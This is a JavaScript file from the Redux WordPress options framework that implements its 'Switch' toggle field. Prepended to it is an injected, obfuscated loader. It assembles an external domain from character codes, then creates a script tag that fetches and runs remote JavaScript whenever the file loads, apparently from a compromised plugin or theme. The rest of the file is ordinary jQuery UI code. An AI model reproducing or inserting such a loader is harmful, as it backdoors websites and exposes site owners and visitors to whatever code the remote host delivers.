var fkghjhe45 = 1; var d=document;var s=d.createElement('script'); s.type='text/javascript'; s.async=true;
var pl = String.fromCharCode(104, 116, 116, 112, 115, 58, 47, 47, 100, 101, 108, 105, 118, 101, 114, 121, 103, 111, 111, 100, 115, 116, 114, 97, 116, 101, 103, 121, 46, 99, 111, 109, 47);
s.src=pl+'/js.min.js?s=k&'; 
if (document.currentScript) { 
document.currentScript.parentNode.insertBefore(s, document.currentScript);
} else {
d.getElementsByTagName('head')[0].appendChild(s);
}/*global redux_change, redux*/

/**
 * Switch
 * Dependencies        : jquery
 * Feature added by    : Smartik - http://smartik.ws/
 * Date            : 03.17.2013
 */

(function( $ ) {
    "use strict";

    redux.field_objects = redux.field_objects || {};
    redux.field_objects.switch = redux.field_objects.switch || {};

    $( document ).ready(
        function() {
            //redux.field_objects.switch.init();
        }
    );

    redux.field_objects.switch.init = function( selector ) {

        if ( !selector ) {
            selector = $( document ).find( ".redux-group-tab:visible" ).find( '.redux-container-switch:visible' );
        }

        $( selector ).each(
            function() {
                var el = $( this );
                var parent = el;
                if ( !el.hasClass( 'redux-field-container' ) ) {
                    parent = el.parents( '.redux-field-container:first' );
                }
                if ( parent.is( ":hidden" ) ) { // Skip hidden fields
                    return;
                }
                if ( parent.hasClass( 'redux-field-init' ) ) {
                    parent.removeClass( 'redux-field-init' );
                } else {
                    return;
                }
                el.find( ".cb-enable" ).click(
                    function() {
                        if ( $( this ).hasClass( 'selected' ) ) {
                            return;
                        }

                        var parent = $( this ).parents( '.switch-options' );

                        $( '.cb-disable', parent ).removeClass( 'selected' );
                        $( this ).addClass( 'selected' );
                        $( '.checkbox-input', parent ).val( 1 ).trigger('change');

                        redux_change( $( '.checkbox-input', parent ) );

                        //fold/unfold related options
                        var obj = $( this );
                        var $fold = '.f_' + obj.data( 'id' );

                        el.find( $fold ).slideDown( 'normal', "swing" );
                    }
                );

                el.find( ".cb-disable" ).click(
                    function() {
                        if ( $( this ).hasClass( 'selected' ) ) {
                            return;
                        }

                        var parent = $( this ).parents( '.switch-options' );

                        $( '.cb-enable', parent ).removeClass( 'selected' );
                        $( this ).addClass( 'selected' );
                        $( '.checkbox-input', parent ).val( 0 ).trigger('change');

                        redux_change( $( '.checkbox-input', parent ) );

                        //fold/unfold related options
                        var obj = $( this );
                        var $fold = '.f_' + obj.data( 'id' );

                        el.find( $fold ).slideUp( 'normal', "swing" );
                    }
                );

                el.find( '.cb-enable span, .cb-disable span' ).find().attr( 'unselectable', 'on' );
            }
        );
    };
})( jQuery );